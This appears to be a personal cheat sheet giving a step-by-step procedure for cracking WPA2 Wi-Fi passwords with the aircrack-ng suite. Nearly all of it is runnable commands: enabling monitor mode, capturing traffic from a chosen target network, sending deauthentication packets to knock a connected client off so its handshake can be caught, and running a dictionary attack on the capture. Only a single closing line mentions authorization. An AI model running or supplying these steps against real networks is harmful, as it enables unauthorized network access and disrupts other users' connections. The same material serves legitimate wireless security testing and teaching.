# WPA2 Packet Capture and Dictionary Cracking Cheat Sheet

## Prerequisites
Ensure `aircrack-ng` is installed:
```bash
sudo dnf install aircrack-ng
```

## Custom Scripts
### Enable Monitor Mode
```bash
sudo ./monitor -on
```

### Disable Monitor Mode
```bash
sudo ./monitor -off
```

## Step-by-Step Guide

### 1. Enable Monitor Mode
```bash
sudo ./monitor -on
```

### 2. Start Packet Capture with Airodump-ng
Identify your target network's BSSID and channel:
```bash
sudo airodump-ng wlo1
```

Start capturing packets for the target network:
```bash
sudo airodump-ng --bssid <BSSID> --channel <CHANNEL> --write capture wlo1
```
Replace `<BSSID>` with the BSSID of the target network and `<CHANNEL>` with the channel number.

### 3. Capture WPA2 Handshake
Optionally, deauthenticate a client to force a handshake capture:
```bash
sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT> wlo1
```
Replace `<CLIENT>` with the MAC address of a connected client.

### 4. Verify Handshake Capture
Ensure that you have successfully captured the handshake. Look for "WPA handshake" in the top-right corner of the airodump-ng output.

### 5. Perform Dictionary Attack with Aircrack-ng
```bash
sudo aircrack-ng -w /path/to/wordlist.txt -b <BSSID> capture-01.cap
```
Replace `/path/to/wordlist.txt` with the path to your wordlist and `<BSSID>` with the BSSID of the target network.

### 6. Disable Monitor Mode
```bash
sudo ./monitor -off
```

## Notes
- Ensure you have the proper authorization to test the network security, as unauthorized access is illegal.
- Replace `wlo1` with your network adapter's name if different.
```

